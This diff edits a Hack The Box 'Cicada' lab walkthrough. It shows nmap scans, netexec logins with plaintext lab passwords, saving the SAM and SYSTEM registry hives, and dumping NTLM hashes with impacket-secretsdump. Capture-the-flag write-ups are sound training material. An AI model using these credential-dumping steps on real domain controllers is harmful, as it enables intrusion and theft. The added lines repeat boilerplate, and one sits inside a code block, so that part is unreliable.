@@ -1,3 +1,4 @@
+
 # HTB - Cicada
 
 **IP Address:** `10.10.11.35`  
@@ -32,6 +33,9 @@ This privilege allows the extraction of the **SAM** and **SYSTEM** registry hive
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 We start by verifying whether the target is alive using an ICMP echo request:
 
 ```bash
@@ -45,6 +49,9 @@ The host responds, confirming it is reachable and ready for further enumeration.
 ---
 
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 We perform a full TCP port scan to identify all open services on the target:
 
@@ -74,6 +81,9 @@ extractPorts allPorts
 ---
 
 ### 1.3 Targeted Scan
+
+Run a deeper scan on the identified ports with version detection and default scripts:
+
 
 Using the open ports obtained from the previous step, we run a targeted Nmap scan with service/version detection and default NSE scripts:
 
@@ -108,7 +118,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63646 10.10.11.35 -
 The presence of **Kerberos (88)**, **LDAP/LDAPS (389, 636)**, and **SMB (445)** confirms that the target is a **Windows Domain Controller**.
 
 ---
-## 2. SMB Enumeration
+## 2. Service Enumeration
 
 ### 2.1 Checking SMB Shares (Unauthenticated)
 
@@ -328,6 +338,9 @@ The login is successful.
 
 ### 3.5 Checking WinRM for David
 
+Continue the attack chain with the next commands:
+
+
 ```bash
 netexec winrm 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
@@ -337,9 +350,14 @@ netexec winrm 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 **Result:**  
 WinRM is also disabled for this account.
 
+
+Continue the attack chain with the next commands:
+
 ---
 
 ### 3.6 Enumerating Shares for David
+
+Enumerate SMB shares with David’s credentials to find additional data stores:
 
 ```bash
 netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
@@ -387,6 +405,8 @@ The script contains plaintext credentials for another account:
 ---
 
 ### 3.9 Checking SMB and WinRM for Emily
+
+Validate SMB and WinRM with Emily’s credentials:
 
 ```bash
 netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
@@ -449,6 +469,9 @@ reg save hklm\system C:\temp\system.hive
 
 We transfer both files to our local machine:
 
+Continue the attack chain with the next commands:
+
+
 ```bash
 download sam.hive 
 download system.hive
@@ -462,6 +485,9 @@ We use `impacket-secretsdump` locally to dump the NTLM hashes from the extracted
 
 ```bash
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+Continue the attack chain with the next commands:
+
 ```
 
 ![local_hives](screenshots/local_hives.png)
